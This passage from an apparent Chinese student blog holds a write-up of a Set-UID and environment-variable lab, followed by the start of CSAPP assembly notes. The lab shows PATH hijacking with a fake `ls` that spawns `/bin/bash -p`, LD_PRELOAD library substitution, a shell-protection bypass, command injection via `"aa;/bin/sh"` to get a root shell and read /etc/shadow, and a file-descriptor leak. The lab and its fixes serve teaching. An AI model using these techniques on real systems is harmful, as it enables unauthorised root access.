src="/posts/3c8e3d23/image-20211021195323867.png" alt="image-20211021195323867">函数execve()的作用，其调用格式如下：<br>int execve(const char * filename，char * const argv[]，char * const envp[])<br>其有三个参数，第一个参数filename指向要运行的新程序的路径，第二个参数argv数组包含新程序的所有参数，第三个参数envp数组包含新程序的环境变量。</p><p>如果将envrion传给execve()函数，则新进程想将他自己的环境变量传给新程序。如果设为NULL，则不传递任何环境变量</p><h3 id="step-3-2"><a class="markdownIt-Anchor" href="#step-3-2"></a> Step 3</h3><p>进程在被初始化时通过以下两种方式获取环境变量。</p><p>第一种方式，如果是一个新创建的进程，即使用fork（）系统调用(在UNLX中)生成的进程，在这种情况下，子进程的内存是父进程内存的副本，也就是说，子进程将继承父进程所有的环境变量。</p><p>第二种方式，如果进程自身通过 execve（）系统调用运行一个新的程序（而不是在子进程中运行），进程的内存将会被新程序的数据覆盖，因此进程中存储的所有环境变量将会丢失。如果一个进程希望将环境变量传递给新运行的程序，它需要在调用 execve（）函数时显式地传递环境变量。</p><h2 id="task-4"><a class="markdownIt-Anchor" href="#task-4"></a> Task 4</h2><p>保存编译运行下方的代码，可以发现结果是打印出了环境变量</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/usr/bin/env&quot;</span>);<br>return0 ;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/posts/3c8e3d23/image-20211021202226212.png" alt="image-20211021202226212"></p><p>system（）的函数说明</p><p>system（）会调用fork()产生子进程，由子进程来调用/bin/sh-c string来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。在调用system（）期间SIGCHLD 信号会被暂时搁置，SIGINT和SIGQUIT 信号则会被忽略。</p><p>返回值</p><p>如果fork（）失败 返回-1：出现错误</p><p>如果exec（）失败，表示不能执行Shell，返回值相当于Shell执行了<a href="https://baike.baidu.com/item/exit">exit</a>（127）</p><p>如果执行成功则返回子Shell的终止状态</p><p>如果system（）在调用/bin/sh时失败则返回127，其他失败原因返回-1。若参数string为空指针（NULL），仅当命令处理程序可用时，返回非零值，可以通过这一特征判断在一个给定的操作系统上是否支持system函数(当system函数返回值为0时，表明system函数无效，在UNIX系统中，system函数总是可用的)；。如果system（）调用成功则最后会返回执行shell命令后的返回值，但是此返回值也有可能为 system（）调用/bin/sh失败所返回的127，因此最好能再检查errno 来确认执行成功。</p><h2 id="task-5"><a class="markdownIt-Anchor" href="#task-5"></a> Task 5</h2><h3 id="step-1-3"><a class="markdownIt-Anchor" href="#step-1-3"></a> Step 1</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span>**environ;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (environ[i] != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, environ[i]);<br>        i++;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>将代码保存在foo.c中</p><p>编译运行，打印出环境变量</p><p><img src="/posts/3c8e3d23/image-20211021203257312.png" alt="image-20211021203257312"></p><h3 id="step-2-3"><a class="markdownIt-Anchor" href="#step-2-3"></a> Step 2</h3><p>将程序的拥有者改为root, 同时将其变成set-UID程序</p><p><img src="/posts/3c8e3d23/image-20211021204849038.png" alt="image-20211021204849038"></p><h3 id="step-3-3"><a class="markdownIt-Anchor" href="#step-3-3"></a> Step 3</h3><p>按照题目要求设置三个环境变量，然后运行已经是特权程序的foo。</p><p>我们可以看到wza和PATH环境变量都成功出现，但是LD_LIBRARY_PATH始终没有出现在环境变量中</p><p><img src="/posts/3c8e3d23/image-20211022110105522.png" alt="image-20211022110105522"></p><p><img src="/posts/3c8e3d23/image-20211022110154632.png" alt="image-20211022110154632"></p><p>运行foo单独抓去LD变量，可以发现输出为空白，没有找到</p><p>我们将foo的拥有者改回seed ，发现LD_LIBRARY_PATH这个出现了。</p><p>这说明这个环境变量会对动态链接器的行为产生影响，所以它在动态链接器的进程中被屏蔽掉了，从而不会再对特权程序的动态链接产生影响。</p><p><img src="/posts/3c8e3d23/image-20211022110351472.png" alt="image-20211022110351472"></p><h2 id="task-6"><a class="markdownIt-Anchor" href="#task-6"></a> Task 6</h2><p>运行代码</p><p>task6.c</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>恶意代码</p><p>ls.c</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>将运行代码编译后保存为task6可执行文件</p><p>将恶意代码编译保存为ls,保存在当前文件夹中</p><p>首先我们执行task6,此时正常调用/bin/ls指令</p><p>然后我们改变task6的所有者为root,同时设置其为特权程序，然后将当前文件夹包含在环境变量PATH中，再次执行我们发现程序得到的只是一个普通的shell</p><p><img src="/posts/3c8e3d23/image-20211024152521937.png" alt="image-20211024152521937"></p><p><img src="/posts/3c8e3d23/image-20211022115545732.png" alt="image-20211022115545732"></p><p>阅读资料后我们可以知道，这是由于Ubuntu20.04的保护机制导致的，我们采用<code>sudo ln -sf /bin/zsh /bin/sh</code>将/bin/sh指向一个特别的shell的程序即可</p><p>再次执行，我们发现程序成功创建了一个具有root权限的shell程序。</p><p><strong>实验原理</strong>是system会调用/bin/sh来执行命令，而shell会在PATH中搜索要使用的命令，所以当我们把我们的恶意程序放在当前目录，并且把当前目录加到环境变量PATH中时，当执行task6就会调用我们的恶意代码，从而成功创建一个shell进程，又因为task6是一个具有root权限的特权程序，所以我们创建的是一个具有root权限的shell进程。</p><h2 id="task-7"><a class="markdownIt-Anchor" href="#task-7"></a> Task 7</h2><h3 id="step-1-4"><a class="markdownIt-Anchor" href="#step-1-4"></a> Step 1</h3><p>mylib.c</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sleep</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">/*If this is invoked by a privileged program,</span><br><span class="hljs-comment">you can do damages here!*/</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I am not sleeping!\n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>按照题目要求编译但不链接mylib.c</p><p>创建一个新的共享库，并将该共享库加入LD_PRELOAD环境变量。</p><p><img src="/posts/3c8e3d23/image-20211022170152068.png" alt="image-20211022170152068"></p><p>myprog.c</p><p>编译该文件，保存可执行文件为myprog</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/*myprog.c*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="step-2-4"><a class="markdownIt-Anchor" href="#step-2-4"></a> Step 2</h3><ul><li><p>正常运行myprog</p><p><img src="/posts/3c8e3d23/image-20211022172148790.png" alt="image-20211022172148790"></p><p>程序行为被改变，调用了mylib.c 的sleep程序</p></li><li><p>将myprog设置为具有root权限的set-UID程序后再次执行</p><p><img src="/posts/3c8e3d23/image-20211022172502079.png" alt="image-20211022172502079"></p><p>程序行为正常，正常调用了lib中的sleep语句 ，睡眠了1s后返回。</p></li><li><p>在root权限下再次export LD_LIBRARY变量，然后再次执行</p><p><img src="/posts/3c8e3d23/image-20211022182847388.png" alt="image-20211022182847388"></p><p>发现程序行为再次被改变，调用了mylib.c 的sleep程序</p></li><li><p>要求在另一个用户下运行seed用户的set-UID程序，并重新export LD_LIBRARY变量</p><p>首先利用<code>sudo su</code> 进入root用户</p><p>然后用<code>sudo adduser seed2</code> 创建一个新的用户seed2</p><p>然后<code>su seed2</code>切换到 seed2</p><p><img src="/posts/3c8e3d23/image-20211022185658486.png" alt="image-20211022185658486"></p><p>运行root权限的set-UID程序，程序正常执行lib库的sleep函数，睡眠1s</p><p><img src="/posts/3c8e3d23/image-20211022190037146.png" alt="image-20211022190037146"></p><p>返回seed用户，将程序改为seed用户的特权程序，然后重新重新export LD_LIBRARY变量</p><p>运行，程序依旧正常执行lib库的sleep函数，睡眠1s</p><p><img src="/posts/3c8e3d23/image-20211022190532236.png" alt="image-20211022190532236"></p></li></ul><h3 id="step-3-4"><a class="markdownIt-Anchor" href="#step-3-4"></a> Step 3</h3><p>Linux动态链接器会在一些默认目录中寻找程序所使用的库，用户可以在LD_PRELOAD和LD_LIBRARY_PATH环境变量来增加新的搜索目录和库文件</p><p>我们设置了LD_PRELOAD后可以让链接器将sleep()函数和我们的代码mylib.c连接起来，而不是和标准库libc库中的sleep()函数链接起来。</p><p>所以这导致第一种情况下正常运行myprog程序行为的改变</p><p>而在第二种情况下，我们将程序改为root权限的特权程序后正常执行，这是因为动态链接库的一些防御措施，当进程的真实用户ID和有效用户ID不一样，进程将忽略LD_PRELOAD环境变量。</p><p>在第三种情况下，我们将用户改为root, 然后在运行具有root权限的特权程序后，程序再次改变了行为，调用了mylib.c代码，这是因为真实用户ID和有效用户ID一样，导致防御措施失效了</p><p>在第四种情况下，我们将用户改为seed2，挺好运行然后在运行具有seed用户的特权程序，程序依旧正常执行，防御措施有效。</p><p><strong>实验验证</strong></p><p><img src="/posts/3c8e3d23/image-20211022192624573.png" alt="image-20211022192624573"></p><p>我们复制eve到 当前目录为myenv，然后将其设置为root权限的特权程序，之后设置三个LD变量，用env打印，可以发现三个变量都出现了，用myenv打印发现只出现了一个变量LD_MYOWN</p><p>这就是因为那两个变量对动态链接器的行为会产生影响，所以他们在Set-UID程序中被屏蔽了，从而不会再对特权程序的动态链接产生任何影响，而LD_MYOWN是自己定义的，不会被动态链接器使用，所以没有安全威胁，因此没有被屏蔽。</p><h2 id="task-8"><a class="markdownIt-Anchor" href="#task-8"></a> Task 8</h2><h3 id="step-1-5"><a class="markdownIt-Anchor" href="#step-1-5"></a> Step 1</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> * v[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">char</span> * command;<br>    <span class="hljs-keyword">if</span>(argc &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please type a filename.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    v[<span class="hljs-number">0</span>] =<span class="hljs-string">&quot;/bin/cat&quot;</span>; v[<span class="hljs-number">1</span>] = argv[<span class="hljs-number">1</span>]; v[<span class="hljs-number">2</span>] = <span class="hljs-literal">NULL</span>;<br>    command = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">strlen</span>(v[<span class="hljs-number">0</span>]) + <span class="hljs-built_in">strlen</span>(v[<span class="hljs-number">1</span>]) + <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">sprintf</span>(command,<span class="hljs-string">&quot;%s%s&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">//Useonlyoneofthefollowings.</span><br>    <span class="hljs-built_in">system</span>(command);<br>    <span class="hljs-comment">//execve(v[0],v,NULL);</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>编译catall文件，然后将其设置为root权限的特权程序</p><p><img src="/posts/3c8e3d23/image-20211022195314688.png" alt="image-20211022195314688"></p><p>执行如下图所示的指令，可以发现程序创建了一个shell进程，但最开始我们只得到了一个普通的shell程序，这是由于Ubuntu20.04的一个保护机制导致的，我们采用</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo ln -sf <span class="hljs-regexp">/bin/</span>zsh <span class="hljs-regexp">/bin/</span>sh<br></code></pre></div></td></tr></table></figure><p>来使得/bin/sh指向/bin/zsh</p><p>再次调用catall “aa;/bin/sh&quot;，我们发现这次创建了一个具有root权限的shell进程，用cat  /etc/shadow 指令验证，发现成功输出密码，说明我们权限窃取成功。</p><p><img src="/posts/3c8e3d23/image-20211022195229974.png" alt="image-20211022195229974"></p><p><img src="/posts/3c8e3d23/image-20211022200809708.png" alt="image-20211022200809708"></p><h3 id="step-2-5"><a class="markdownIt-Anchor" href="#step-2-5"></a> Step 2</h3><p>注释掉system()，取消注释execve()</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> * v[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">char</span> * command;<br>    <span class="hljs-keyword">if</span>(argc &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please type a filename.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    v[<span class="hljs-number">0</span>] =<span class="hljs-string">&quot;/bin/cat&quot;</span>; v[<span class="hljs-number">1</span>] = argv[<span class="hljs-number">1</span>]; v[<span class="hljs-number">2</span>] = <span class="hljs-literal">NULL</span>;<br>    command = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">strlen</span>(v[<span class="hljs-number">0</span>]) + <span class="hljs-built_in">strlen</span>(v[<span class="hljs-number">1</span>]) + <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">sprintf</span>(command,<span class="hljs-string">&quot;%s%s&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">//Useonlyoneofthefollowings.</span><br>    <span class="hljs-comment">//system(command);</span><br>    <span class="hljs-built_in">execve</span>(v[<span class="hljs-number">0</span>],v,<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>编译修改后的代码保存为safecatall</p><p>依旧将其设置为root权限的特权程序，再次运行<code>safecatall “aa;/bin/sh&quot;</code>我们发现程序没有出现错误</p><p><img src="/posts/3c8e3d23/image-20211022201948533.png" alt="image-20211022201948533"></p><p>第一步中我们得到root权限的原因是因为system(command)函数是通过调用&quot;/bin/sh -c command&quot;完成command指令的，换句话说，外部指令不是上述程序直接执行的，而是shell程序首先被执行，然后shell将command作为输入并解析。但是因为shell过于强大，它可以解析用分号隔开的两条命令，所以当我们输入 “aa;/bin/sh&quot;是，分号后面的指令也被解析并执行了，由此我们得到了一个root权限的shell。</p><p>而使用execve()函数则不会如此，因为它会把那整个字符串作为参数，所以不会发生权限泄露的情况。</p><h2 id="task-9"><a class="markdownIt-Anchor" href="#task-9"></a> Task 9</h2><p>cap_leak.c</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> fd;<br>  <span class="hljs-keyword">char</span> *v[<span class="hljs-number">2</span>];<br><br>  <span class="hljs-comment">/* Assume that /etc/zzz is an important system file,</span><br><span class="hljs-comment">   * and it is owned by root with permission 0644.</span><br><span class="hljs-comment">   * Before running this program, you should create</span><br><span class="hljs-comment">   * the file /etc/zzz first. */</span><br>  fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/etc/zzz&quot;</span>, O_RDWR | O_APPEND);        <br>  <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Cannot open /etc/zzz\n&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// Print out the file descriptor value</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd is %d\n&quot;</span>, fd);<br><br>  <span class="hljs-comment">// Permanently disable the privilege by making the</span><br>  <span class="hljs-comment">// effective uid the same as the real uid</span><br>  <span class="hljs-built_in">setuid</span>(<span class="hljs-built_in">getuid</span>());                                <br><br>  <span class="hljs-comment">// Execute /bin/sh</span><br>  v[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>; v[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">execve</span>(v[<span class="hljs-number">0</span>], v, <span class="hljs-number">0</span>);                             <br>&#125;<br></code></pre></div></td></tr></table></figure><p>上述代码展示了一个root用户的Set-UID程序。程序运行分为三步。第一步，它打开了一个只有root用户可以修改的文件/etc/zz。在文件被打开后，程序定义了一个文件描述符，通过该文件描述符完成后续对文件的操作。文件描述符是权限的一种形式，任何拥有它的人都可以访问对应的文件。第二步，通过将有效用户ID(roo)变得跟真实用户ID一样，程序降低了自身的权限，实际上相当于放弃了进程的root特权。第三步，程序调用了一个 shell 程序</p><p>然而上述程序忘记了关闭文件，文件描述符仍然有效，因此这个非特权进程仍然可以修改/etc/zzz文件。从程序的执行结果来看，可以发现文件描述符的值是3.通过echo&gt;&amp;3”命令可以修改/etc/zz文件。这里“&amp;3”表示文件描述符3. 在运行这个 SET-UID程序之前，无法修改受保护的/ete/zz文件。但是通过 SET-UID程序获得文件描述符后，可以成功地修改该文件。</p><p><img src="/posts/3c8e3d23/image-20211022204515258.png" alt="image-20211022204515258"></p><p>为了修复该程序中的权限泄露问题，应该在降低特权之前先销毁权限，用close(fd)关闭文件描述符即可。</p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>软件安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件安全</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机系统学习笔记</title>
    <link href="/posts/e0eae192/"/>
    <url>/posts/e0eae192/</url>
    
    <content type="html"><![CDATA[<h1 id="深入理解计算机系统csapp"><a class="markdownIt-Anchor" href="#深入理解计算机系统csapp"></a> 深入理解计算机系统（csapp）</h1><h2 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h2><p><img src="/posts/e0eae192/image-20210414171144939.png" alt="image-20210414171144939"></p><p><img src="/posts/e0eae192/image-20210414171238561.png" alt="image-20210414171238561"></p><ul><li><p>终端</p><p>.c  -&gt;  .i    (预处理)   gcc -E hello.c -o hello.i</p><p>.i   -&gt;  .s（汇编语言）     gcc -S hello.o -o hello.s</p><p>.s  -&gt;  .o（机器代码） gcc -c  hello.o -o hello.o</p><p>查看.o    objdump hello.o</p><p>变成可执行文件（链接）   gcc hello.o -o hello</p></li></ul><hr><h2 id="第二章-汇编入门"><a class="markdownIt-Anchor" href="#第二章-汇编入门"></a> 第二章 汇编入门</h2><h3 id="通用寄存器"><a class="markdownIt-Anchor" href="#通用寄存器"></a> 通用寄存器</h3><p><img src="/posts/e0eae192/image-20210315165706496.png" alt="image-20210315165706496"></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316104330207.png" alt="image-20210316104330207"></p><h3 id="数据传送"><a class="markdownIt-Anchor" href="#数据传送"></a> 数据传送</h3><p><img src="/posts/e0eae192/image-20210315165822191.png" alt="image-20210315165822191"></p><h3 id="寻址方式"><a class="markdownIt-Anchor" href="#寻址方式"></a> 寻址方式</h3><p><img src="/posts/e0eae192/image-20210316111854447.png" alt="image-20210316111854447"></p><p><img src="/posts/e0eae192/image-20210316112953982.png" alt></p><h3 id="gdb-x-命令详解"><a class="markdownIt-Anchor" href="#gdb-x-命令详解"></a> gdb x 命令详解</h3><p>格式：x/&lt;n/f/u&gt; <addr></addr></p><p><strong>n</strong>:</p><p>是正整数，表示需要显示的内存单元的个数，即从当前地址向后显示n个内存单元的内容，一个内存单元的大小由第三个参数u定义。</p><p><strong>f</strong>:</p><p>表示addr指向的内存内容的输出格式，s对应输出字符串，此处需特别注意输出整型数据的格式：</p><p>x 按十六进制格式显示变量。</p><p>d 按十进制格式显示变量。</p><p>u 按十六进制格式显示无符号整型。</p><p>o 按八进制格式显示变量。</p><p>t 按二进制格式显示变量。</p><p>a 按十六进制格式显示变量。</p><p>c 按字符格式显示变量。</p><p>f 按浮点数格式显示变量。</p><p><strong>u</strong>:</p><p>就是指以多少个字节作为一个内存单元-unit,默认为4。当然u还可以用被一些字符表示，如b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes.<br><addr>:表示内存地址。</addr></p><p>整合这个命令的诠释：就是以addr为起始地址，返回n个单元的值，每个单元对应u个字节，输出格式是f。</p><p>如：x/ 3uh 0x54320表示：以地址0x54320为起始地址，返回3个单元的值，每个单元有两个字节，输出格式为无符号十六进制。</p><p>也就是说返回了3*2=6个字节的数据，以十六进制输出，这6个字节的数据，每两个字节为一个单元输出，共输出3个单元。</p><h3 id="栈操作指令"><a class="markdownIt-Anchor" href="#栈操作指令"></a> 栈操作指令</h3><p><img src="/posts/e0eae192/image-20210315190744590.png" alt="image-20210315190744590"></p><p>栈顶是朝着低地址方向生长</p><h3 id="算术逻辑运算指令"><a class="markdownIt-Anchor" href="#算术逻辑运算指令"></a> 算术逻辑运算指令</h3><p>高32位放%edx</p><p>算术右移：填充符号位</p><p>逻辑移位：左边填0</p><p><img src="/posts/e0eae192/image-20210315190841025.png" alt="image-20210315190841025"></p><p><img src="/posts/e0eae192/image-20210414183735292.png" alt="image-20210414183735292"></p><p><img src="/posts/e0eae192/image-20210414183744478.png" alt="image-20210414183744478"></p><h3 id="条件跳转指令"><a class="markdownIt-Anchor" href="#条件跳转指令"></a> 条件跳转指令</h3><p><img src="/posts/e0eae192/image-20210315195500018.png" alt="image-20210315195500018"></p><p><img src="/posts/e0eae192/image-20210315195530982.png" alt="image-20210315195530982"></p><h3 id="标志位指令"><a class="markdownIt-Anchor" href="#标志位指令"></a> 标志位指令</h3><p><img src="/posts/e0eae192/image-20210414173258979.png" alt="image-20210414173258979"></p><p>最后一提：计算机对带/无符号数的机器码统一处理<br>O F ， Ｃ Ｆ 等 标 志 位 是 由 机 器 码 运 算 结 果 决 定 的 ， 是 否 为 带 符 号 数 并 不 影 响</p><p>终极简单的判定方法：</p><p>求OF就把机器码转成带符号数然后运算，看有没有溢出</p><p>求CF同理，转成无符号数，然后运算看有没有溢出</p><h3 id="正溢出-和-负溢出"><a class="markdownIt-Anchor" href="#正溢出-和-负溢出"></a> 正溢出 和 负溢出</h3><p>如果位数 为w 